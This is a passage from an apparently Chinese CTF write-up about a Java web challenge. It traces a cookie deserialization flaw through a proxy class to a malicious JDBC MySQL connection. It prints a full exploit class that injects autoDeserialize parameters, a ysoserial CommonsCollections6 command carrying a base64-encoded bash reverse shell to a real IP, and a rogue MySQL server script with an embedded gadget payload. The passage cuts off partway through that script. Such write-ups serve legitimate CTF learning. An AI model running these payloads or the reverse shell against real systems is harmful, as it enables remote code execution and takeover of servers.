class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> Object <span class="title function_">deserialize</span><span class="params">(String base64data)</span> &#123;</span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64data));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">SerialKiller</span> <span class="variable">serialKiller</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(bais, <span class="string">&quot;serialkiller.conf&quot;</span>);</span><br><span class="line">      obj = serialKiller.readObject();</span><br><span class="line">      serialKiller.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>InfoInvocationHandler.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.gdufs.challenge.web.invocation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InfoInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">  <span class="keyword">private</span> Info info;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">InfoInvocationHandler</span><span class="params">(Info info)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.info = info;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;getAllInfo&quot;</span>) &amp;&amp; </span><br><span class="line">        !<span class="built_in">this</span>.info.checkAllInfo().booleanValue())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; </span><br><span class="line">      <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.info, args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>DatabaseInfo.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.gdufs.challenge.web.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DatabaseInfo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Info &#123;</span><br><span class="line">  <span class="keyword">private</span> String host;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> String port;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> String username;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> String password;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> Connection connection;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHost</span><span class="params">(String host)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.host = host;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPort</span><span class="params">(String port)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.port = port;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.username = username;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.password = password;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getHost</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.host;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getPort</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.port;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.username;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.password;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.connection == <span class="literal">null</span>)</span><br><span class="line">      connect(); </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.connection;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://&quot;</span> + <span class="built_in">this</span>.host + <span class="string">&quot;:&quot;</span> + <span class="built_in">this</span>.port + <span class="string">&quot;/jdbc?user=&quot;</span> + <span class="built_in">this</span>.username + <span class="string">&quot;&amp;password=&quot;</span> + <span class="built_in">this</span>.password + <span class="string">&quot;&amp;connectTimeout=3000&amp;socketTimeout=6000&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.connection = DriverManager.getConnection(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Boolean <span class="title function_">checkAllInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.host == <span class="literal">null</span> || <span class="built_in">this</span>.port == <span class="literal">null</span> || <span class="built_in">this</span>.username == <span class="literal">null</span> || <span class="built_in">this</span>.password == <span class="literal">null</span>)</span><br><span class="line">      <span class="keyword">return</span> Boolean.valueOf(<span class="literal">false</span>); </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.connection == <span class="literal">null</span>)</span><br><span class="line">      connect(); </span><br><span class="line">    <span class="keyword">return</span> Boolean.valueOf(<span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getAllInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Here is the configuration of database, host is &quot;</span> + <span class="built_in">this</span>.host + <span class="string">&quot;, port is &quot;</span> + <span class="built_in">this</span>.port + <span class="string">&quot;, username is &quot;</span> + <span class="built_in">this</span>.username + <span class="string">&quot;, password is &quot;</span> + <span class="built_in">this</span>.password + <span class="string">&quot;.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Info.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.gdufs.challenge.web.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">  Boolean <span class="title function_">checkAllInfo</span><span class="params">()</span>;</span><br><span class="line">  </span><br><span class="line">  String <span class="title function_">getAllInfo</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>UserInfo.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.gdufs.challenge.web.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInfo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Info &#123;</span><br><span class="line">  <span class="keyword">private</span> String username;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> String password;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.username = username;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.password = password;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.username;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.password;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Boolean <span class="title function_">checkAllInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Boolean.valueOf((<span class="built_in">this</span>.username != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.password != <span class="literal">null</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getAllInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Your username is &quot;</span> + <span class="built_in">this</span>.username + <span class="string">&quot;, and your password is &quot;</span> + <span class="built_in">this</span>.password + <span class="string">&quot;.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一共就上述这几个文件组成   那么我们就可以开始分析(<strong>先导入到idea里</strong>)</p><p>这里的话先看反序列化入口</p><p><img src="../images/image-20230526150141923.png" alt="image-20230526150141923"></p><p>这里话就是会将cookie的值来进行反序列化</p><p>但是之前我们虽然看到了有<code>cc3.2.1</code>链子的依赖，但是，没啥用，因为这里的</p><p><code>serialkiller.conf</code>里面存在白名单  </p><p><img src="../images/image-20230526150417284.png" alt="image-20230526150417284"></p><p><strong>只允许gdufs和java.lang的类进行反序列化</strong></p><p>所以cc链直接打就不行了</p><p>于是我们就想别的方法  <strong>入口点在他自己写的一个代理类上面</strong></p><p><img src="../images/image-20230526150655974.png" alt="image-20230526150655974"></p><p>我们在调用他的<code>invoke</code>方法的时候，他会调用到<code>checkAllInfo()</code>方法  并且<code>info</code>可控</p><p>于是我们去看看哪个类里边存在<code>checkAllInfo()</code>方法</p><p><img src="../images/image-20230526150925311.png" alt="image-20230526150925311"></p><p>在<code>DatabaseInfo</code>这个类里边存在这个方法，并且最后还调用了自身的<code>connect()</code>方法</p><p>于是我们跟进这个<code>connect()</code>方法</p><p><img src="../images/image-20230526151040859.png" alt="image-20230526151040859"></p><p>发现了他存在<code>jdbc mysql</code>的恶意利用，这里就可以进行恶意代码执行了</p><p>由于我们前面查看的mysql连接器的版本是<code>8.0.19</code></p><p>于是就找了payload</p><p><img src="../images/image-20230526151250799.png" alt="image-20230526151250799"></p><p><strong>利用链</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InfoInvocationHandler.invoke()</span><br><span class="line"> -&gt;DatabaseInfo.checkAllInfo()</span><br><span class="line">   -&gt;DatabaseInfo.connect()</span><br></pre></td></tr></table></figure><p><strong>所以大致攻击流程为：</strong><br>cookie反序列化-&gt;反序列化出来的对象走invoke方法-&gt;向vps发jdbc请求-&gt;vps发恶意包-&gt;弹shell</p><p>那么接下来就开始编写EXP</p><p><strong>Myexp.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> gdufs.challenge.web.model;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.*;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myexp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * databaseinfo * */</span></span><br><span class="line">        DatabaseInfo databaseinfo=<span class="keyword">new</span> <span class="title class_">DatabaseInfo</span>();</span><br><span class="line">        databaseinfo.setHost(<span class="string">&quot;101.42.39.110&quot;</span>);</span><br><span class="line">        databaseinfo.setPort(<span class="string">&quot;3306&quot;</span>);</span><br><span class="line">        databaseinfo.setUsername(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        databaseinfo.setPassword(<span class="string">&quot;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * infoInvocationHandler * */</span></span><br><span class="line">        InfoInvocationHandler infoInvocationHandler=<span class="keyword">new</span> <span class="title class_">InfoInvocationHandler</span>(databaseinfo);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * info */</span></span><br><span class="line">        Info info=(Info)Proxy.newProxyInstance(databaseinfo.getClass().getClassLoader(),databaseinfo.getClass().getInterfaces(), infoInvocationHandler);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 接下来按照源代码序列化的info用base64打出来</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(info);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        String str=<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后用ysoserial工具生成一个payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections6 <span class="string">&quot;bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwMS40Mi4zOS4xMTAvMzM4OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; payload</span><br></pre></td></tr></table></figure><p>这里的生成文件名不能进行修改，因为得和等会部署的mysql恶意服务端里的文件相对应(<strong>这里用cc6是因为给的cc依赖是3.2.1</strong>)</p><p><strong>mysql.py </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span 